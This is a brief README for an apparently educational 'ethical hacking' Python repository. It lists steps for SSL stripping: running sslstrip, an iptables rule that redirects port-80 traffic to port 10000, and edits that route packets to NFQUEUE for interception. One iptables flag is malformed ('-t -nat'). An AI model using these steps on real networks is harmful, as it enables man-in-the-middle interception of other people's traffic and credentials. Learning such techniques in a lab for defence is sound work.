# python-ethical-hacking
Scripts for basic ethical hacking

## To bypass HTTPS:

1. Run `sslstrip` in Terminal
2. Run `iptables -t -nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000` in Terminal
3. Replace `subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)` in code to `subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)` and `subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)`
4. Replace any reference to port 80 in code to port 10000
